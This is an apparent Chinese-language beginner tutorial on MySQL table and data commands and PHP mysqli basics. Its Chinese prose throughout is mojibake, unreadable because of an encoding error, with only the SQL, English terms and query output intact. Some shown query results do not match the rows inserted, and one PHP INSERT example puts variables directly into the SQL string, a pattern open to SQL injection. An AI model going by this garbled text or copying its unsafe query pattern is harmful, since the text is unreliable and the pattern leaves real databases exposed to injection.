æ•°æ®è¡¨æ•°æ®è¡¨çš„åŸºæœ¬æ“ä½œå…¨éƒ½æ˜¯åœ¨é€‰æ‹©äº†æ•°æ®åº“çš„å‰æä¸‹,ä¸€å®šè¦åœ¨é€‰æ‹©äº†æ•°æ®åº“çš„å‰æä¸‹ã€‚ 1.åˆ›å»ºè¡¨create table XX(è¡¨å)(å­—æ®µ1å æ•°æ®ç±»å‹ï¼Œå­—æ®µ2å æ•°æ®ç±»å‹,â€¦â€¦.å­—æ®µnå æ•°æ®ç±»å‹); è¿™ä¸ªåˆ›å»ºè¡¨å¯ä»¥æ‰“ä¸ªæ¯”æ–¹ï¼Œå¦‚æœè¦ä½ ç”¨Excelåšä¸€ä»½ç­çº§æˆç»©è¡¨ï¼Œä½ ä¼šæ€ä¹ˆåšï¼Ÿè‚¯å®šå…ˆæœ‰ä¸ªæ ‡é¢˜å§ï¼Œæ¯”æ–¹è¯´â€œ18çº§ç½‘ç»œäºŒç­æœŸæœ«æˆç»©è¡¨â€ï¼Œè¿™é‡Œçš„æ ‡é¢˜å°±ç›¸å½“äºæˆ‘ä»¬çš„è¡¨åã€‚æ ‡é¢˜æœ‰äº†ï¼Œæˆ‘ä»¬å¾—åœ¨ç¬¬ä¸€è¡Œå†™ä¸Šâ€œå­¦å·â€ã€â€œå§“åâ€ã€â€œæ€»æˆç»©â€å§ï¼Œæ¥å‘Šè¯‰çœ‹è¿™ä¸ªè¡¨çš„äººï¼Œæ¯ä¸€åˆ—ä»£è¡¨çš„ä»€ä¹ˆä¸œè¥¿ï¼Œè¿™é‡Œçš„â€œå­¦å·â€ã€â€œå§“åâ€ã€â€œæ€»æˆç»©â€å°±ç›¸å½“äºæˆ‘ä»¬çš„å­—æ®µåã€‚åˆ°è¿™é‡Œï¼Œéƒ½è¿™åº”è¯¥å¯¹è¿™æ®µä»£ç æœ‰æ‰€äº†è§£äº†ï¼Œä¸‹é¢æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ•°æ®è¡¨ã€‚ MySQL [qq1]&gt; create table stu(-&gt; id varchar(20),-&gt; name varchar(10),-&gt; score int-&gt; ); å›è½¦ä¹‹åæ˜¾ç¤º Query OK, 0 rows affected (0.09 sec) è¡¨ç¤ºå·²ç»æˆåŠŸåˆ›å»ºä¸€ä¸ªè¡¨äº†ã€‚è¿™é‡Œæ³¨æ„å†™ä¸€è¡Œåˆ«å¿˜è®° , å’Œæœ€åçš„ ï¼›ä¸ç„¶å‡ºé”™äº†åˆè¦é‡æ–°æ•²ä¸€æ¬¡ã€‚ è¿™é‡Œè®²ä¸€è®²mysqlæ•°æ®ç±»å‹çš„çŸ¥è¯†ã€‚ æ•°æ®ç±»å‹ï¼šint æ•´å‹tinyint æ•´å‹ï¼ˆ0-256ï¼‰decimal æµ®ç‚¹å‹ï¼ˆæ€»ä½æ•°ï¼Œå°æ•°ä½æ•°ï¼‰ ä¾‹å¦‚ decimal(3,1)char(X) å®šé•¿å­—ç¬¦å‹ ä¾‹å¦‚ char(10)varchar(X) å¯å˜é•¿åº¦å­—ç¬¦å‹ ä¾‹å¦‚varcharï¼ˆ10ï¼‰text å¤§æ®µæ–‡æœ¬ binary äºŒè¿›åˆ¶ï¼ˆå­˜å‚¨ç…§ç‰‡ç­‰ï¼‰ å’ŒCè¯­è¨€ç±»ä¼¼ã€‚ å­—æ®µå±æ€§ï¼š null:ç©ºnot null:ä¸ä¸ºç©ºdefault â€˜XXXXâ€™ï¼šé»˜è®¤å€¼auto_incrementï¼šè‡ªåŠ¨å¢é•¿primary keyï¼šä¸»é”®(ä¸»é”®çš„ç‰¹ç‚¹ï¼Œä¸ä¸ºç©ºï¼Œä¸é‡å¤,ä¸€ä¸ªè¡¨åªèƒ½æœ‰ä¸€ä¸ªä¸»é”®ï¼Œä½†æ˜¯ä¸€ä¸ªä¸»é”®å¯ä»¥ç”±å¤šä¸ªåˆ—ç»„æˆ) å…·ä½“çš„æ²¡å¿…è¦å¤šè¯´ï¼Œåªè¦äº†è§£å¸¸ç”¨çš„æ•°æ®ç±»å‹å³å¯ã€‚ç°åœ¨æˆ‘å¯ä»¥è®²è®²â€œLatinâ€å’Œâ€œutf8â€çš„åŒºåˆ«äº†ï¼Œå¦‚æœæ˜¯åœ¨â€œLatinâ€å­—ç¬¦ä¸‹åˆ›å»ºçš„æ•°æ®è¡¨ï¼Œé‚£ä¹ˆä¸€ä¸ªä¸­æ–‡ç­‰äºä¸¤ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±ç›¸å½“äºï¼Œå¦‚æœåå­—æ˜¯å››ä¸ªå­—ï¼Œå°±è¦charï¼ˆ8ï¼‰ã€‚ä½†å¦‚æœæ˜¯åœ¨â€œutf8â€å­—ç¬¦ä¸‹åˆ›å»ºçš„æ•°æ®è¡¨ï¼Œä¸€ä¸ªä¸­æ–‡ç­‰äºä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœåå­—æ˜¯å››ä¸ªå­—ï¼Œåªéœ€è¦charï¼ˆ4ï¼‰å°±å¤Ÿäº†ã€‚ è¿˜æœ‰å¦‚æœä½ è¿˜æ˜¯è¦ç”¨å…³é”®å­—åˆ›å»ºå­—æ®µåæˆ–è€…è¡¨åçš„è¯ï¼Œå’Œä¹‹å‰ä¸€æ ·è¦ç”¨`` 2.æŸ¥çœ‹è¡¨show tables; ä¸€å®šè¦æ˜¯tablesï¼Œå› ä¸ºä¸€ä¸ªMySQLé‡Œé¢æœ‰å¤šä¸ªæ•°æ®åº“ï¼Œæ‰€ä»¥ï¼Œä¸€ä¸ªæ•°æ®åº“é‡Œé¢ä¹Ÿå¯ä»¥æœ‰å¤šä¸ªè¡¨ï¼Œå½“ç„¶ï¼Œä¸€ä¸ªè¡¨é‡Œé¢ä¹Ÿå¯ä»¥æœ‰å¤šä¸ªæ•°æ®ï¼Œä½†æ˜¯åªæœ‰ä¸€ä¸ªè¡¨çš„è¯ï¼Œä¹Ÿè¦ä½¿ç”¨tablesï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åé¢çš„æ˜¾ç¤ºåˆ›å»ºçš„è¡¨ã€‚ å›è½¦ä¹‹åä¼šæ˜¾ç¤ºä½ åˆšåˆšåˆ›å»ºçš„è¡¨ +â€”â€”â€”â€”â€”+| Tables_in_qq1 |+â€”â€”â€”â€”â€”+| stu |+â€”â€”â€”â€”â€”+1 row in set (0.00 sec) 3.æ˜¾ç¤ºåˆ›å»ºè¡¨show create table XX(è¡¨å);show create table XX(è¡¨å) \\G; ä¸Šé¢ä¸¤æ®µä»£ç éƒ½æ˜¯æ˜¾ç¤ºåˆ›å»ºè¡¨ï¼Œåªä¸è¿‡æ˜¾ç¤ºçš„æ ·å¼ä¸åŒï¼Œéšæ„é€‰æ‹©ä¸€ç§å³å¯ ä¸Šé¢é‚£ç§ä¼šæ˜¾ç¤º +â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-+ Table Create Table +â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+ stu CREATE TABLE stu ( id varchar(20) DEFAULT NULL, name varchar(10) DEFAULT NULL, score int(11) DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8 +â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+ 1 row in set (0.00 sec) ä¸‹é¢é‚£ç§ä¼šæ˜¾ç¤º ******************\\*** 1. row ******************\\***Table: stuCreate Table: CREATE TABLE stu (id varchar(20) DEFAULT NULL,name varchar(10) DEFAULT NULL,score int(11) DEFAULT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf81 row in set (0.00 sec) ERROR:No query specified ##è®°å¾—ç™¾åº¦ERRORï¼› 4.æ˜¾ç¤ºè¡¨çš„ç»“æ„describe(æˆ–desc) XX(è¡¨å); å›è½¦ä¹‹åä¼šæ˜¾ç¤ºåˆšåˆšæˆ‘åˆ›å»ºçš„è¡¨çš„ç»“æ„ +â€”â€”-+â€”â€”â€”â€”-+â€”â€”+â€”â€“+â€”â€”â€”+â€”â€”-+| Field | Type | Null | Key | Default | Extra |+â€”â€”-+â€”â€”â€”â€”-+â€”â€”+â€”â€“+â€”â€”â€”+â€”â€”-+| id | varchar(20) | YES | | NULL | || name | varchar(10) | YES | | NULL | || score | int(11) | YES | | NULL | |+â€”â€”-+â€”â€”â€”â€”-+â€”â€”+â€”â€“+â€”â€”â€”+â€”â€”-+3 rows in set (0.00 sec) è§£é‡Šæ¯ä¸ªè¡¨å¤´çš„å«ä¹‰ å…¶ä¸­ id ,name,scoreéƒ½æ˜¯å­—æ®µï¼Œç„¶åvarcharä»€ä¹ˆçš„éƒ½æ˜¯å­—æ®µçš„å†…å‹ã€‚ å› ä¸ºç°åœ¨ä»€ä¹ˆéƒ½æ²¡æœ‰å†™è¿›å»ï¼Œæ‰€ä»¥æ˜¯ç©ºçš„ã€‚keyæ˜¯è¯´æ˜¯ä¸æ˜¯ä¸»é”®ã€‚ 5.åˆ é™¤è¡¨drop table XX(è¡¨å);*drop table XX,XX,XXâ€¦â€¦; åœ¨è¿™é‡Œå› ä¸ºåé¢è¿˜è¦ç”¨åˆ°è¡¨ï¼Œæˆ‘ä»¬åªåˆ›å»ºäº†ä¸€ä¸ªè¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å†åˆ›å»ºä¸€ä¸ªè¡¨ï¼Œ MySQL [qq1]&gt; create table stu1(-&gt; id varchar(20),-&gt; name varchar(10),-&gt; score int-&gt; ); æ¥æ¼”ç¤ºåˆ é™¤ åˆ›å»ºå¥½äº†ä¹‹åæŸ¥çœ‹ä¸€ä¸‹è¡¨çš„å¤šå°‘ï¼ˆshow tables;ï¼‰ã€‚ å›è½¦ä¹‹åæ˜¾ç¤º Query OK, 0 rows affected (0.04 sec) #è¡¨ç¤ºåˆ é™¤æˆåŠŸã€‚ æˆ‘ä»¬å†æ¥æŸ¥çœ‹ä¸€ä¸‹è¡¨ã€‚å‘ç°å°‘äº†ä¸€ä¸ªï¼Œè¡¨ç¤ºåˆ é™¤æˆåŠŸã€‚ æ•°æ®çš„åŸºæœ¬æ“ä½œæ•°æ®çš„æ“ä½œç®—æ˜¯æ•´ä¸ªMySQLä¸­æœ€å¤æ‚çš„éƒ¨åˆ†ï¼Œè™½ç„¶æ¦‚æ‹¬èµ·æ¥æ— éå°±æ˜¯â€œå¢åˆ æŸ¥æ”¹â€ï¼Œä½†æ¯ä¸€é¡¹åº•ä¸‹åŒ…å«çš„å†…å®¹éå¸¸ä¹‹å¤šï¼Œæˆ‘æ¯”è¾ƒèœï¼Œæ‰€ä»¥å°½åŠ›è€Œä¸ºã€‚ 1.æ’å…¥æ•°æ®è¿™ä¸ªè¦åœ¨è¡¨çš„åº•ä¸‹å®ç°ï¼Œæ‰€ä»¥è¦å…ˆæœ‰ä¸ªè¡¨ 1insert into XXï¼ˆè¡¨åï¼‰ (å­—æ®µ1,å­—æ®µ2,å­—æ®µ3......) values (å€¼1,å€¼2,å€¼3.......); æ¯”å¦‚åœ¨è‡ªå·±çš„stuè¡¨ä¸­æ’å…¥ä¸€äº›ä¿¡æ¯ insert into stu (id,name,score) values(â€œ201801â€,â€æŸæŸâ€,90); åƒä¸‡è¦æ³¨æ„ä¸è¦å†™å…¥ä¸­æ–‡ç¬¦å·ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œåƒä¸‡åƒä¸‡ã€‚ å›è½¦ä¹‹åæœ‰ä¸‹é¢ä¸€æ®µä»£ç ï¼Œæ˜¾ç¤ºæˆåŠŸæ’å…¥æ•°æ® Query OK, 1 row affected (0.00 sec) æˆ‘ä»¬å†æ’å…¥å‡ æ¡ä¿¡æ¯ insert into stu (id,name,score) values(â€œ201820â€,â€å˜¿å˜¿â€,70); insert into stu (id,name,score) values(â€œ201830â€,â€lalaâ€,90); ç„¶åçœ‹ä¸‹é¢çš„æŸ¥è¯¢æ•°æ® 2.æŸ¥è¯¢æ•°æ®è®©å¤§å®¶çœ‹ä¸€ä¸‹æ’å…¥æ•°æ®ä¹‹åï¼Œè¡¨å†…å˜æˆä»€ä¹ˆæ ·äº†ï¼Œ é¦–å…ˆç»™å¤§å®¶ä»‹ç»ä¸€ä¸ªçŸ¥è¯†ç‚¹â€”â€”è¿ç®—ç¬¦æ¯”è¾ƒè¿ç®—ç¬¦ &gt;ã€&gt;=ã€&lt;ã€&lt;=ã€=ï¼ˆæ¯”è¾ƒå’Œèµ‹å€¼éƒ½æ˜¯â€=â€ï¼‰ã€&lt;&gt;ï¼ˆä¸ç­‰äºï¼‰ é€»è¾‘è¿ç®—ç¬¦ éï¼ˆnotï¼‰ andï¼ˆä¸ï¼‰orï¼ˆæˆ–ï¼‰ å’ŒCè¯­è¨€å·®ä¸å¤šï¼Œä½†æ˜¯æœ‰çš„æœ‰åŒºåˆ«ï¼Œä¸è¦æ··æ·†ã€‚ 1ã€æŸ¥è¯¢ä¸€ä¸ªè¡¨é‡Œé¢çš„æ•°æ®select * from XXï¼ˆè¡¨åï¼‰; æˆ‘ä»¬ æ¥æŸ¥è¯¢åˆšåˆšåˆ›å»ºçš„è¡¨çš„æ•°æ® select * from stu; å›è½¦æ˜¾ç¤ºå†…å®¹ +â€”â€”â€“+â€”â€”â€“+â€”â€”-+| id | name | score |+â€”â€”â€“+â€”â€”â€“+â€”â€”-+| 201801 | æŸæŸ | 90 || 201810 | å•¥å•¥ | 80 || 201810 | å•¥å•¥ | 80 || 201820 | å˜¿å˜¿ | 70 |+â€”â€”â€“+â€”â€”â€“+â€”â€”-+4 rows in set (0.00 sec) 2ã€æŸ¥è¯¢ä¸€ä¸ªè¡¨é‡Œé¢æŸå­—æ®µ çš„æ‰€æœ‰æ•°æ®select å­—æ®µ1,å­—æ®µ2,å­—æ®µ3â€¦â€¦ï¼ˆæˆ–ç”¨â€*â€ä»£æ›¿æ‰€æœ‰å­—æ®µï¼‰ from XXï¼ˆè¡¨åï¼‰; ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬æŸ¥è¯¢â€œidâ€å­—æ®µåº•ä¸‹æ‰€æœ‰çš„æ•°æ®ï¼Œé‚£ä¹ˆâ€idâ€œä¸‹æœ‰å“ªäº›æ•°æ®ï¼Œå°±ä¼šå±•ç°å‡ºæ¥ select id from stu; å›è½¦æ˜¾ç¤ºè¿™ä¸ªè¡¨é‡Œé¢idå­—æ®µä¸‹çš„æ‰€æœ‰çš„æ•°æ® +â€”â€”â€“+| id |+â€”â€”â€“+| 201801 || 201810 || 201810 || 201820 |+â€”â€”â€“+4 rows in set (0.00 sec) 3.æˆ‘ä»¬ä¹Ÿå¯ä»¥æ ¹æ®æ¡ä»¶æ¥æŸ¥è¯¢ä¿¡æ¯select * from XXï¼ˆè¡¨åï¼‰where å­—æ®µ1 = å€¼1 and å­—æ®µ2 = å€¼2 and â€¦â€¦; ä¾‹å¦‚æˆ‘ä»¬æ¥æŸ¥è¯¢stué‡Œé¢nameæ˜¯æŸæŸçš„å¹¶ä¸”scoreæ˜¯90çš„äºº select * from stu where score =90 and name=â€æŸæŸâ€; å›è½¦æ˜¾ç¤ºå†…å®¹ +â€”â€”â€“+â€”â€”â€“+â€”â€”-+| id | name | score |+â€”â€”â€“+â€”â€”â€“+â€”â€”-+| 201801 | æŸæŸ | 90 |+â€”â€”â€“+â€”â€”â€“+â€”â€”-+1 row in set (0.02 sec) 4.æˆ‘ä»¬ä¹Ÿå¯ä»¥æœç´¢select * from stu where score &gt; 90 or score &lt; 60; è¿™ä¸ªå°±æ˜¯æŸ¥æ‰¾è¡¨ä¸­åˆ†æ•°åœ¨90ä»¥ä¸Šæˆ–è€…60ä»¥ä¸‹çš„äºº è¦æ˜¯æ²¡æœ‰çš„è¯ï¼Œå°±ä¼šæ˜¾ç¤ºè¿™æ®µä¿¡æ¯ã€‚ Empty set (0.00 sec) è¿™ä¸ªå°±æ˜¯æŸ¥æ‰¾è¡¨ä¸­åˆ†æ•°åœ¨80ä»¥ä¸Šæˆ–è€…60ä»¥ä¸‹çš„äºº +â€”â€”â€“+â€”â€”â€“+â€”â€”-+| id | name | score |+â€”â€”â€“+â€”â€”â€“+â€”â€”-+| 201801 | æŸæŸ | 90 |+â€”â€”â€“+â€”â€”â€“+â€”â€”-+1 row in set (0.00 sec) 5.å¯¹æ•°æ®è¿›è¡Œæ’åºselect * from XXï¼ˆè¡¨åï¼‰ order by å­—æ®µx asc;ï¼ˆé»˜è®¤å°±æ˜¯å‡åºï¼Œä½â€”â€”â€”â€”é«˜ï¼‰ è¿™é‡Œæ¼”ç¤ºä¸€ä¸ªæŒ‰ç…§idåºå·æ¥æ’åºã€‚ select * from stu order by id asc; å›è½¦ä¹‹åæ˜¾ç¤º +â€”â€”â€“+â€”â€”â€“+â€”â€”-+| id | name | score |+â€”â€”â€“+â€”â€”â€“+â€”â€”-+| 201801 | æŸæŸ | 90 || 201810 | å•¥å•¥ | 80 || 201810 | å•¥å•¥ | 80 || 201820 | å˜¿å˜¿ | 70 |+â€”â€”â€“+â€”â€”â€“+â€”â€”-+ select * from XXï¼ˆè¡¨åï¼‰ order by å­—æ®µx desc; ï¼ˆé«˜â€”â€”â€”ä½ï¼‰ select * from XXï¼ˆè¡¨åï¼‰ where å­—æ®µx = å€¼x oreder by å­—æ®µx asc(desc); ï¼ˆæŒ‰ç…§æŸç§æ¡ä»¶æ’åºï¼‰ select * from XXï¼ˆè¡¨åï¼‰ limit n; ï¼ˆå–å‰næ¡æ•°æ®ï¼‰ ä¸‹é¢æ¼”ç¤ºä¸€ä¸ªå–å‰ä¸¤æ¡æ•°æ® select * from stu limit 2; å›è½¦ä¹‹åæ˜¾ç¤º +â€”â€”â€“+â€”â€”â€“+â€”â€”-+| id | name | score |+â€”â€”â€“+â€”â€”â€“+â€”â€”-+| 201801 | æŸæŸ | 90 || 201810 | å•¥å•¥ | 80 |+â€”â€”â€“+â€”â€”â€“+â€”â€”-+2 rows in set (0.00 sec) å…¶ä»–çš„å°±ä¸ä¸¾ä¾‹äº†ã€‚è‡ªå·±å¯ä»¥è¯•ä¸€è¯•ã€‚ select * from XXï¼ˆè¡¨åï¼‰ limit n,m; ï¼ˆä»ç¬¬næ¡å¼€å§‹å–mæ¡æ•°æ® ï¼‰ *select \\ from XXï¼ˆè¡¨åï¼‰ order by å­—æ®µx asc(desc) limit n;**ï¼ˆå–æŸç§æ’åºä¸‹çš„å‰næ¡æ•°æ®ï¼‰ 3.åˆ é™¤æ•°æ®delete from XXï¼ˆè¡¨åï¼‰ where å­—æ®µx = å€¼x; ä¸¾ä¾‹è¯´æ˜ delete from stu where id=201801; å›è½¦ä¹‹åï¼Œåœ¨æŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œçœ‹æ˜¯ä¸æ˜¯å°‘äº†ç¬¬ä¸€æ¡ä¿¡æ¯ï¼Œ select * from stu; å›è½¦ä¹‹åå‘ç°å°‘äº†å“ªä¸€è¡Œid=201801çš„æ•°æ®ã€‚è¿™æ ·å°±åˆ é™¤æ•°æ®æˆåŠŸäº†ã€‚ ç„¶ååœ¨ä½¿ç”¨select * from stu; æ¥çœ‹çœ‹è‡ªå·±æ˜¯å¦çœŸçš„åˆ é™¤æˆåŠŸäº†ï¼Œ +â€”â€”â€“+â€”â€”â€“+â€”â€”-+| id | name | score |+â€”â€”â€“+â€”â€”â€“+â€”â€”-+| 201810 | å•¥å•¥ | 80 || 201810 | å•¥å•¥ | 80 || 201820 | å˜¿å˜¿ | 70 |+â€”â€”â€“+â€”â€”â€“+â€”â€”-+3 rows in set (0.01 sec) 4.ä¿®æ”¹æ•°æ®update XXï¼ˆè¡¨åï¼‰ set å­—æ®µ1 = å€¼1,å­—æ®µ2 = å€¼2 where æ¡ä»¶;update XXï¼ˆè¡¨åï¼‰ set å­—æ®µ1 = å€¼1; ä¸‹é¢ä¸€æ¡çš„ä½œç”¨æ˜¯ä¿®æ”¹æŸä¸€å­—æ®µçš„æ‰€æœ‰å€¼ï¼Œæ‰€ä»¥ä¸éœ€è¦åŠ æ¡ä»¶ã€‚ å®ä¾‹ update stu set id = 201710,name = â€œå•¦å•¦â€ where id = 201810 ; å›è½¦ä¹‹åæ˜¾ç¤º Query OK, 2 rows affected (0.01 sec)Rows matched: 2 Changed: 2 Warnings: 0 è¡¨ç¤ºä¿®æ”¹æˆåŠŸã€‚ ç„¶åæˆ‘ä»¬å†æ¥æŸ¥è¯¢ä¸€ä¸‹è¡¨çš„ä¿¡æ¯ã€‚ select * from stu; å›è½¦ä¹‹åæ˜¾ç¤º +â€”â€”â€“+â€”â€”â€“+â€”â€”-+ id name score +â€”â€”â€“+â€”â€”â€“+â€”â€”-+ 201710 å•¦å•¦ 80 201710 å•¦å•¦ 80 â€”â€”â€”- â€”â€”â€“ â€”â€” 201820 å˜¿å˜¿ 70 â€”â€”â€”- â€”â€”â€“ â€”â€” +â€”â€”â€“+â€”â€”â€“+â€”â€”-+ 3 rows in set (0.00 sec) æ³¨æ„è¿™é‡Œçš„ç¬¬ä¸€æ¡ä¿¡æ¯ï¼Œå·²ç»æ”¹å˜äº†ã€‚ ç„¶åæˆ‘ä»¬å°±å¯ä»¥åœ¨phpstromä¸­å°è¯•è¿™äº›è¯­å¥ï¼Œçœ‹æ˜¯ä¸æ˜¯ä¸€æ ·çš„ã€‚phpéƒ¨åˆ†å…¥é—¨ â‘ PHPä¸­çš„å˜é‡ï¼Œå£°æ˜ä¸ä½¿ç”¨ï¼Œå¿…é¡»ä½¿ç”¨$å¼€å¤´ã€‚ â‘¡PHPæ˜¯ä¸€ç§å¼±ç±»å‹è¯­è¨€ï¼Œå˜é‡å…¶å®å¹¶ä¸éœ€è¦å£°æ˜ï¼Œå¯ä»¥ç›´æ¥ç»™å˜é‡èµ‹ä»»ä½•ç±»å‹çš„å€¼ï¼› â‘¢PHPä¸­å¯ä»¥ä½¿ç”¨è¿ç­‰åŒæ—¶å£°æ˜å¤šä¸ªå˜é‡ã€‚è€Œä¸èƒ½ä½¿ç”¨é€—å·åˆ†éš”ã€‚ egï¼š$num1=$num2=$num3=5; â‘£å¸¸ç”¨å˜é‡å‡½æ•°ï¼š unset()ï¼šåˆ é™¤å¹¶é‡Šæ”¾å˜é‡ï¼› isset()ï¼šæ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®ï¼› empty()ï¼šæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºç©ºï¼ˆæœªè®¾ç½®æˆ–å€¼ä¸ºNulléƒ½ç®—ç©ºï¼‰ï¼› â‘¤å˜é‡çš„å‘½åï¼šåªèƒ½æœ‰å­—æ¯æ•°å­—ä¸‹åˆ’çº¿ç»„æˆï¼Œå¼€å¤´ä¸èƒ½æ˜¯æ•°å­—ã€‚è€Œä¸”ï¼ŒPHPä¸­å˜é‡åŒºåˆ†å¤§å°å†™ï¼ï¼$name,$Nnme,$NAMEéƒ½æ˜¯ä¸åŒå˜é‡ï¼› ä½†æ˜¯ï¼ŒPHPçš„å†…ç½®å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™ï¼echo EcHoéƒ½æ˜¯æœ‰æ•ˆçš„ã€‚ è¿æ¥è¿™é‡Œé¢æœ‰[ä¸å†ä½¿ç”¨mysql_connect()æ¥è¿æ¥æ•°æ®åº“]çš„è§£é‡Š å› ä¸ºä»– ä¼šæ˜¾ç¤º ä¸æ¨èä½¿ç”¨mysqlæ‰©å±•ï¼Œå°†æ¥ä¼šåˆ é™¤å®ƒ æœ¬æ‰©å±•è‡ª PHP 5.5.0 èµ·å·²åºŸå¼ƒï¼Œå¹¶åœ¨å°†æ¥ä¼šè¢«ç§»é™¤ã€‚åº”ä½¿ç”¨ MySQLi æˆ– PDO_MySQL æ‰©å±•æ¥æ›¿æ¢ä¹‹ã€‚å‚è§ MySQLï¼šé€‰æ‹© API æŒ‡å—ä»¥åŠç›¸å…³ FAQ ä»¥è·å–æ›´å¤šä¿¡æ¯ è¯¦æƒ…è¯·äº†è§£ä¸‹é¢ã€‚ https://www.cnblogs.com/wangtao_20/p/4823088.html è¿æ¥è§£é‡Šï¼š mysqli_connect_errno() è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œæ ‡è¯†è¿æ¥æ•°æ®åº“æ˜¯å¦æˆåŠŸå’Œå„ç§é”™è¯¯çš„æ•°å€¼ã€‚ mysqli_connect_error() è¿”å›è¿æ¥é”™è¯¯ä¿¡æ¯ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›è¿æ¥æƒ…å†µï¼š mysqli_connect_errno mysqli_connect_error 2002 php_network_getaddresses: getaddrinfo failed: ä¸çŸ¥é“è¿™æ ·çš„ä¸»æœºã€‚ 1045 Access denied for user â€˜wjjâ€™@â€™localhostâ€™ (using password: YES) 1049 Unknown database â€˜testâ€™ 0(è¿æ¥æˆåŠŸ) null åˆ›å»ºæ•°æ®åº“è¯­å¥ï¼š**$sql=â€™CREATE DATABASE aa â€˜;**create databaseå¤§å°å†™éƒ½å¯ä»¥ï¼Œ PHP ä½¿ç”¨ mysqli_query å‡½æ•°æ¥åˆ›å»ºæˆ–è€…åˆ é™¤ MySQL æ•°æ®åº“ã€‚è¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œåœ¨æ‰§è¡ŒæˆåŠŸæ—¶è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚ åˆ é™¤æ•°æ®åº“è¯­å¥ï¼š**$sql=â€™DROP DATABASE aa â€˜;** åœ¨ä½¿ç”¨PHPè„šæœ¬åˆ é™¤æ•°æ®åº“æ—¶ï¼Œä¸ä¼šå‡ºç°ç¡®è®¤æ˜¯å¦åˆ é™¤ä¿¡æ¯ï¼Œä¼šç›´æ¥åˆ é™¤æŒ‡å®šæ•°æ®åº“ï¼Œæ‰€ä»¥ä½ åœ¨åˆ é™¤æ•°æ®åº“æ—¶è¦ç‰¹åˆ«å°å¿ƒã€‚åƒä¸‡å°å¿ƒã€‚ é€‰æ‹©æ•°æ®åº“è¯­å¥ï¼šmysqli_select_db($conn,â€™aaâ€™);aaæ˜¯æŒ‡ä½ é€‰æ‹©çš„æ•°æ®åº“åå­—ï¼Œè¿™ä¸ªæ“ä½œç®€å•ï¼Œä¸æ¼”ç¤ºäº†ã€‚ åˆ›å»ºæ•°æ®è¡¨è¯­å¥ï¼š $sql=â€CREATE TABLE bb_1(â€œ.**â€œbb_id INT NOT NULL AUTO_INCREMENT,â€.â€œbb_title VARCHAR(100) NOT NULL,â€.â€œbb_name VARCHAR(40) NOT NULL,â€.â€œbb_data DATE, â€œ.â€œPRIMARY KEY(bb_id))ENGINE=InnoDB DEFAULT CHARSET=utf8;â€;** ä¸€å®šè¦çœ‹æ¸…æ¥šæ‹¬å·å’Œ, .;ä¸è¦å°‘ä¸€ä¸ªå¤šä¸€ä¸ªï¼Œ PRIMARY KEY(bb_id)ä¸»é”®æ˜¯Id AUTO_INCREMENTçš„æ„æ€æ˜¯è‡ªå·±å¢åŠ ï¼Œidè‡ªå·±å¢åŠ ï¼Œè¿™æ ·æ–¹ä¾¿ä¸€ç‚¹ã€‚ ENGINE=InnoDB è¡¨ç¤ºå°†æ•°æ®åº“çš„å¼•æ“è®¾ç½®ä¸ºInnoDB,ä»MySQL 5.6å¼€å§‹é»˜è®¤ä½¿ç”¨è¯¥å¼•æ“ã€‚ DEFAULT CHARSET=utf8 è¡¨ç¤ºè®¾ç½®æ•°æ®åº“çš„é»˜è®¤å­—ç¬¦é›†ä¸ºutf8 åˆ é™¤æ•°æ®è¡¨è¯­å¥ï¼š$sql=â€DROP TABLE bb_1â€; mysqli_select_db($conn,â€™aaâ€™); ä¸€å®šä¸è¦å¿˜è®°å†™è¿™ä¸€å¥mysqli_select_db($conn,â€™aaâ€™); è¿™ä¸€å¥çš„æ„æ€æ˜¯è¯´åœ¨è¿™ä¸ªaaæ•°æ®åº“é‡Œé¢åˆ é™¤bb_1çš„æ•°æ®è¡¨ã€‚ åœ¨æ•°æ®è¡¨é‡Œé¢æ’å…¥æ•°æ®è¯­å¥ï¼š $sql=â€INSERT INTO bb_1â€. â€œ(bb_title,bb_name,bb_data)â€.â€‹â€‹ â€œVALUESâ€.â€‹â€‹ â€œ(â€˜$bb_titleâ€™,â€™$bb_nameâ€™,â€™$bb_dataâ€™)â€;â€‹â€‹ å¯ä»¥å¤šæ’å…¥å‡ æ¡æ•°æ®ï¼Œä¸€æ ·çš„å½¢å¼ï¼Œä¿®æ”¹æ•°æ®å°±å¥½äº†ã€‚â€‹â€‹ ç„¶åå°±å¯ä»¥åœ¨ä½ çš„æ•°æ®åº“é‡Œé¢çœ‹åˆ°è¿™äº›æ•°æ®äº†ã€‚â€‹â€‹â€‹â€‹ æŸ¥è¯¢æ•°æ®1.1è¯­å¥ï¼š $sql=â€™SELECT bb_id,bb_title,bb_name,bb_data FROM bb_1â€™; bb_id,bb_title,bb_name,bb_dataéƒ½æ˜¯å­—æ®µ 